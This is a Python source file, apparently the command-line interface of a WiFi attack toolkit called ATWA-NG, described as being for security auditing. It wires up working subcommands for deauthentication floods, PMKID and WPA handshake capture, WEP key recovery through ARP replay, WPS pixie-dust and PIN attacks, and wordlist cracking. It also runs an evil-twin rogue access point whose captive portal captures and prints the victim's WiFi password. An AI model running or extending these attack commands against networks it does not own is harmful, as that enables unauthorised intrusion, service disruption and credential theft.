"""ATWA-NG unified CLI — fully self-contained, no external runtime
dependencies on any other project's code.

  - scan: channel-hopping AP/client discovery, backed by a
    locally-compiled scanning engine (scanner.py).
  - deauth-inject, injection-test, wps-recon, crack-cap: packet-injection
    and cracking paths backed by locally-compiled engines in vendor/.
  - deauth, pmkid, handshake, omni, smart, wep, wps-pixie, wps-oneshot,
    crack: native-Python attack implementations (attacks/, wep/, wps/,
    crack/), imported here with plain relative imports (`.`/`..`) —
    nothing is hardcoded to the package name, so this whole folder can
    be renamed or moved without breaking.
  - eviltwin, gui: rogue-AP/captive-portal and desktop GUI wiring around
    the same engine.
"""

from __future__ import annotations

import argparse
import signal
import subprocess
import sys
import time
from pathlib import Path

from .scan_engine import HOPSCAN_BIN, ScanEngineNotBuilt
from .scanner import scan_live

_VENDOR_ROOT = Path(__file__).resolve().parents[2] / "vendor" / "aircrack-ng"
_REAVER_ROOT = Path(__file__).resolve().parents[2] / "vendor" / "reaver" / "src"
INJECTOR_BIN = _VENDOR_ROOT / "aireplay-ng"
CAPCRACK_BIN = _VENDOR_ROOT / "aircrack-ng"
WPSRECON_BIN = _REAVER_ROOT / "wash"


def _cmd_scan(args) -> int:
    """Locally-compiled scan engine, not the scapy hopper."""
    try:
        result = scan_live(args.iface, duration=args.duration, band=args.band)
    except ScanEngineNotBuilt as e:
        print(f"error: {e}", file=sys.stderr)
        return 1
    for n in sorted(result.networks, key=lambda n: n.bssid):
        print(f"{n.bssid}  ch={n.channel}  {n.privacy}/{n.cipher}  "
              f"pwr={n.power}  beacons={n.beacons}  essid={n.essid!r}")
    if args.clients:
        for c in result.clients:
            print(f"  client {c.station} -> {c.bssid}  pwr={c.power}  probed={c.probed!r}")
    return 0


def _cmd_gui(args) -> int:
    """ATWA-NG's own copy of the GUI (src/atwa/gui/), physically
    copied from N2-NG_v2's gui/ package. All its imports are relative
    (`from ..radio import ...` etc.) pointing at this package's own
    copied modules, not n2ng2's — see gui/app.py."""
    from .gui.app import main as gui_main
    from .gui.elevate import ensure_root

    ensure_root(demo=args.demo)  # no-op if already root or --demo; else re-execs under sudo and exits
    return gui_main(demo=args.demo)


def _cmd_eviltwin(args) -> int:
    """EvilTwin was GUI-only in N2-NG_v2 (no CLI subcommand existed
    yet); wiring run_eviltwin() (now this package's own copy, attacks/
    eviltwin.py) into this CLI."""
    from .attacks.eviltwin import run_eviltwin
    result = run_eviltwin(
        iface_ap=args.iface_ap, iface_mon=args.iface_mon,
        bssid=args.bssid, ssid=args.ssid, channel=args.channel,
        timeout=args.timeout,
    )
    if result.success:
        print(f"SUCCESS: password captured -> {result.password!r}")
        return 0
    print(f"failed: {result.detail}", file=sys.stderr)
    return 1


# --- Native attacks, ported verbatim from n2ng2/cli.py (same bodies,
# same relative imports — n2ng2/cli.py's own imports were already
# relative to its own package root, and this file sits at the same
# depth in atwa, so they resolve identically against the copied
# modules with zero changes required). ------------------------------

def _cmd_deauth(args) -> int:
    from .attacks.deauth import deauth
    from .frames import BROADCAST

    sent = deauth(
        args.iface,
        bssid=args.bssid,
        client=args.client or BROADCAST,
        count=args.count,
        channel=args.channel,
    )
    print(f"sent {sent} deauth frames to {args.client or 'broadcast'}")
    return 0


def _cmd_pmkid(args) -> int:
    from .attacks.pmkid import capture_pmkid

    line = capture_pmkid(
        args.iface, bssid=args.bssid, client=args.client, channel=args.channel
    )
    if line is None:
        print("no PMKID captured", file=sys.stderr)
        return 1
    print(line)
    return 0


def _cmd_handshake(args) -> int:
    from .attacks.handshake import capture_handshake

    cap = capture_handshake(
        args.iface, bssid=args.bssid, channel=args.channel,
        timeout=args.timeout, outfile=args.outfile,
    )
    for (ap, client), msgs in cap.messages.items():
        status = cap.status(ap, client).value
        print(f"{ap} {client}: messages={sorted(msgs)} [{status}]")
    return 0


def _cmd_omni(args) -> int:
    from .crack.john import JohnCracker, JohnUnavailableError
    from .omni import OmniOrchestrator
    from .scan import scan

    result = scan(args.iface, duration=args.profile_duration, channels=[args.channel] if args.channel else None)
    ap = result.aps.get(args.bssid.lower())
    if ap is None:
        print(f"{args.bssid} not seen during {args.profile_duration}s profile scan", file=sys.stderr)
        return 1

    cracker = None
    if args.wordlist:
        try:
            cracker = JohnCracker()
        except JohnUnavailableError as exc:
            print(f"warning: {exc} — will batch hashes but not crack", file=sys.stderr)

    from .storage import capture_root

    capture_dir = args.capture_dir or str(capture_root())
    orch = OmniOrchestrator(args.iface, cracker=cracker, capture_dir=capture_dir)
    report = orch.run(ap, wordlist=args.wordlist)
    print(report.summary())
    return 0 if report.cracked or not args.wordlist else 1


def _cmd_smart(args) -> int:
    from .crack.john import JohnCracker, JohnUnavailableError
    from .omni import OmniOrchestrator
    from .scan import scan

    result = scan(args.iface, duration=args.profile_duration, channels=[args.channel] if args.channel else None)
    ap = result.aps.get(args.bssid.lower())
    if ap is None:
        print(f"{args.bssid} not seen during {args.profile_duration}s profile scan", file=sys.stderr)
        return 1

    cracker = None
    if args.wordlist:
        try:
            cracker = JohnCracker()
        except JohnUnavailableError as exc:
            print(f"warning: {exc} — will batch hashes but not crack", file=sys.stderr)

    from .storage import capture_root

    capture_dir = args.capture_dir or str(capture_root())
    orch = OmniOrchestrator(args.iface, cracker=cracker, capture_dir=capture_dir)
    report = orch.run_smart(ap, wordlist=args.wordlist)
    print(report.summary())
    return 0 if report.cracked or not args.wordlist else 1


def _cmd_wep(args) -> int:
    from .attacks.wep import crack_wep
    from .radio import get_mac

    client = get_mac(args.iface)
    key = crack_wep(
        args.iface, args.bssid, client, args.ssid, key_len=args.key_len,
        channel=args.channel, target_sessions=args.target_sessions, timeout=args.timeout,
    )
    if key is None:
        print("no key recovered (timed out or no ARP traffic seen)", file=sys.stderr)
        return 1
    print(key.hex())
    return 0


def _cmd_wps_pixie(args) -> int:
    from .attacks.wps import AttemptOutcome, pixie_attempt

    eapol_versions = tuple(int(v) for v in args.eapol_versions.split(","))
    result = pixie_attempt(
        args.iface, args.bssid, args.ssid, channel=args.channel, msg_timeout=args.timeout,
        eapol_versions=eapol_versions, passive=args.passive,
    )
    if result.outcome is AttemptOutcome.SUCCESS:
        print(f"SUCCESS ssid={result.ssid!r} key={result.network_key!r}")
        return 0
    suffix = f" ({result.detail})" if result.detail else ""
    print(f"failed: {result.outcome.name}{suffix}", file=sys.stderr)
    return 1


def _cmd_wps_oneshot(args) -> int:
    from .wps.oneshot import OneShot, Outcome

    with OneShot(args.iface, bssid=args.bssid, verbose=args.verbose) as shot:
        if args.pbc:
            result = shot.single_connection(args.bssid, pbc_mode=True)
        elif args.pin:
            result = shot.single_connection(args.bssid, pin=args.pin)
        else:
            result = shot.pixie_dust_attack(args.bssid)

    if result.outcome is Outcome.SUCCESS:
        print(f"SUCCESS bssid={result.bssid} ssid={result.ssid!r} pin={result.pin!r} key={result.psk!r}")
        return 0
    suffix = f" ({result.detail})" if result.detail else ""
    print(f"failed: {result.outcome.value}{suffix}", file=sys.stderr)
    return 1


def _cmd_crack(args) -> int:
    from .crack.convert import cap_to_22000
    from .crack.john import JohnCracker

    hashfile = args.hashfile
    if hashfile.endswith((".cap", ".pcap", ".pcapng")):
        hashfile = cap_to_22000(hashfile, hashfile + ".22000")
        print(f"converted to {hashfile}")
    results = JohnCracker().crack(hashfile, args.wordlist)
    for hash_id, password in results.items():
        print(f"{hash_id}: {password}")
    return 0 if results else 1


def _cmd_injection_test(args) -> int:
    """Injection self-test mode: confirms the adapter can actually
    inject frames (not just receive) against nearby APs. Runs
    indefinitely testing each AP it finds (confirmed live — cut off
    mid-test by an external timeout still showed real progress, e.g.
    25/30 pings, 83% success), so uses a SIGINT-and-collect pattern
    rather than subprocess.run(timeout=)."""
    if not INJECTOR_BIN.exists():
        print(f"error: {INJECTOR_BIN} not built", file=sys.stderr)
        return 1
    cmd = [str(INJECTOR_BIN), "-9"]
    if args.bssid:
        cmd += ["-a", args.bssid]
    cmd.append(args.iface)
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             stdin=subprocess.DEVNULL, text=True)
    try:
        time.sleep(args.duration)
    finally:
        proc.send_signal(signal.SIGINT)
        try:
            out, _ = proc.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, _ = proc.communicate()
    print(out)
    return 0


def _cmd_wps_recon(args) -> int:
    """WPS-enabled AP reconnaissance via a locally-compiled recon
    engine. Runs continuously, no natural exit — launch, let it run for
    `duration`, then SIGINT and collect what it printed
    (subprocess.run(timeout=) raises instead of doing this cleanly)."""
    if not WPSRECON_BIN.exists():
        print(f"error: {WPSRECON_BIN} not built — see ATWA-NG/STATUS.md", file=sys.stderr)
        return 1
    cmd = [str(WPSRECON_BIN), "-i", args.iface]
    if args.channel:
        cmd += ["-c", str(args.channel)]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             stdin=subprocess.DEVNULL, text=True)
    try:
        time.sleep(args.duration)
    finally:
        proc.send_signal(signal.SIGINT)
        try:
            out, _ = proc.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, _ = proc.communicate()
    print(out)
    return 0


def _run_bounded(cmd: list[str], timeout: float) -> tuple[int, str, str]:
    """subprocess.run with no timeout is a real hang risk here: the
    injection engine prints "Waiting for beacon frame" and blocks
    indefinitely if the target BSSID never shows up on the current
    channel (wrong channel, AP gone, typo'd MAC). Bounded so that case
    fails cleanly instead of hanging the whole command forever."""
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True,
            stdin=subprocess.DEVNULL, timeout=timeout,
        )
        return proc.returncode, proc.stdout, proc.stderr
    except subprocess.TimeoutExpired as e:
        partial_out = (e.stdout or b"").decode(errors="replace") if isinstance(e.stdout, bytes) else (e.stdout or "")
        return 1, partial_out, (
            f"timed out after {timeout}s — likely no beacon seen for the "
            f"target (wrong channel, AP not present, or bad BSSID)"
        )


def _cmd_crack_cap(args) -> int:
    """WPA/WEP cracking via a locally-compiled cracking engine — an
    additional backend alongside John (the existing `crack` command),
    explicitly not hashcat per the user's direction."""
    if not CAPCRACK_BIN.exists():
        print(f"error: {CAPCRACK_BIN} not built", file=sys.stderr)
        return 1
    cmd = [str(CAPCRACK_BIN), "-w", args.wordlist]
    if args.bssid:
        cmd += ["-b", args.bssid]
    cmd.append(args.capfile)
    rc, out, err = _run_bounded(cmd, timeout=args.timeout)
    print(out)
    if rc != 0 and err:
        print(err, file=sys.stderr)
    return rc


def _cmd_deauth_inject(args) -> int:
    """Locally-compiled injection engine, not scapy injection."""
    if not INJECTOR_BIN.exists():
        print(f"error: {INJECTOR_BIN} not built — see ATWA-NG/STATUS.md", file=sys.stderr)
        return 1
    cmd = [str(INJECTOR_BIN), "-0", str(args.count), "-a", args.bssid]
    if args.client:
        cmd += ["-c", args.client]
    cmd.append(args.iface)
    rc, out, err = _run_bounded(cmd, timeout=args.timeout)
    print(out)
    if rc != 0 and err:
        print(err, file=sys.stderr)
    return rc


def build_parser() -> argparse.ArgumentParser:
    from . import __version__

    parser = argparse.ArgumentParser(
        prog="atwa", description="ATWA-NG — unified WiFi security auditing"
    )
    parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    sub = parser.add_subparsers(dest="command", required=True)

    p = sub.add_parser("scan", help="channel-hopping AP/client scan")
    p.add_argument("iface")
    p.add_argument("--duration", type=float, default=10.0)
    p.add_argument("--band", choices=("2.4GHz", "5GHz", "Both"), default="Both")
    p.add_argument("--clients", action="store_true", help="also print associated clients")
    p.set_defaults(func=_cmd_scan)

    p = sub.add_parser("deauth-inject", help="deauth flood via the injection engine")
    p.add_argument("iface")
    p.add_argument("bssid")
    p.add_argument("--client")
    p.add_argument("--count", type=int, default=10)
    p.add_argument("--timeout", type=float, default=30.0, help="give up if no beacon seen")
    p.set_defaults(func=_cmd_deauth_inject)

    p = sub.add_parser("injection-test", help="test packet injection capability")
    p.add_argument("iface")
    p.add_argument("--bssid", help="test against a specific AP instead of any nearby one")
    p.add_argument("--duration", type=int, default=15)
    p.set_defaults(func=_cmd_injection_test)

    p = sub.add_parser("wps-recon", help="WPS-enabled AP reconnaissance")
    p.add_argument("iface")
    p.add_argument("--channel", type=int)
    p.add_argument("--duration", type=int, default=15)
    p.set_defaults(func=_cmd_wps_recon)

    p = sub.add_parser("crack-cap", help="crack a WPA/WEP capture directly (not hashcat)")
    p.add_argument("capfile")
    p.add_argument("wordlist")
    p.add_argument("--bssid")
    p.add_argument("--timeout", type=float, default=3600.0,
                    help="give up after this long (default 1h; wordlist attacks can run long)")
    p.set_defaults(func=_cmd_crack_cap)

    # Everything else: same argument shapes as n2ng2's original CLI,
    # pointing at this package's own copied handler functions above
    # (physically present now, not imported from n2ng2).
    p = sub.add_parser("deauth", help="deauth flood (native scapy)")
    p.add_argument("iface")
    p.add_argument("bssid")
    p.add_argument("--client")
    p.add_argument("--count", type=int, default=64)
    p.add_argument("--channel", type=int)
    p.set_defaults(func=_cmd_deauth)

    p = sub.add_parser("pmkid", help="clientless PMKID capture")
    p.add_argument("iface")
    p.add_argument("bssid")
    p.add_argument("client")
    p.add_argument("--channel", type=int)
    p.set_defaults(func=_cmd_pmkid)

    p = sub.add_parser("handshake", help="4-way handshake capture")
    p.add_argument("iface")
    p.add_argument("bssid")
    p.add_argument("--channel", type=int)
    p.add_argument("--timeout", type=float, default=60.0)
    p.add_argument("--outfile")
    p.set_defaults(func=_cmd_handshake)

    p = sub.add_parser("omni", help="adaptive chain: profile -> pmkid -> handshake -> crack")
    p.add_argument("iface")
    p.add_argument("bssid")
    p.add_argument("--channel", type=int)
    p.add_argument("--profile-duration", type=float, default=8.0)
    p.add_argument("--wordlist")
    p.add_argument("--capture-dir", default=None)
    p.set_defaults(func=_cmd_omni)

    p = sub.add_parser("smart", help="quick attack: pmkid -> deauth+handshake")
    p.add_argument("iface")
    p.add_argument("bssid")
    p.add_argument("--channel", type=int)
    p.add_argument("--profile-duration", type=float, default=8.0)
    p.add_argument("--wordlist")
    p.add_argument("--capture-dir", default=None)
    p.set_defaults(func=_cmd_smart)

    p = sub.add_parser("wep", help="native WEP: fake-auth + ARP replay + PTW")
    p.add_argument("iface")
    p.add_argument("bssid")
    p.add_argument("ssid")
    p.add_argument("--key-len", type=int, default=13, choices=(5, 13))
    p.add_argument("--channel", type=int)
    p.add_argument("--target-sessions", type=int, default=40_000)
    p.add_argument("--timeout", type=float, default=300.0)
    p.set_defaults(func=_cmd_wep)

    p = sub.add_parser("wps-pixie", help="WPS pixie-dust (native scapy monitor mode)")
    p.add_argument("iface")
    p.add_argument("bssid")
    p.add_argument("ssid")
    p.add_argument("--channel", type=int)
    p.add_argument("--timeout", type=float, default=5.0)
    p.add_argument("--eapol-versions", default="2,1")
    p.add_argument("--passive", action="store_true")
    p.set_defaults(func=_cmd_wps_pixie)

    p = sub.add_parser("wps-oneshot", help="WPS via wpa_supplicant managed mode")
    p.add_argument("iface")
    p.add_argument("bssid")
    p.add_argument("--pin")
    p.add_argument("--pbc", action="store_true")
    p.add_argument("--verbose", action="store_true")
    p.set_defaults(func=_cmd_wps_oneshot)

    p = sub.add_parser("gui", help="launch the desktop GUI (ATWA-NG's own copy, see gui/)")
    p.add_argument("--demo", action="store_true")
    p.set_defaults(func=_cmd_gui)

    p = sub.add_parser("crack", help="crack a 22000/cap file with John")
    p.add_argument("hashfile")
    p.add_argument("wordlist")
    p.set_defaults(func=_cmd_crack)

    p = sub.add_parser("eviltwin", help="rogue AP + captive portal (new CLI wiring, was GUI-only)")
    p.add_argument("iface_ap")
    p.add_argument("iface_mon")
    p.add_argument("bssid")
    p.add_argument("ssid")
    p.add_argument("channel", type=int)
    p.add_argument("--timeout", type=float, default=120.0)
    p.set_defaults(func=_cmd_eviltwin)

    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    return args.func(args)


if __name__ == "__main__":
    raise SystemExit(main())
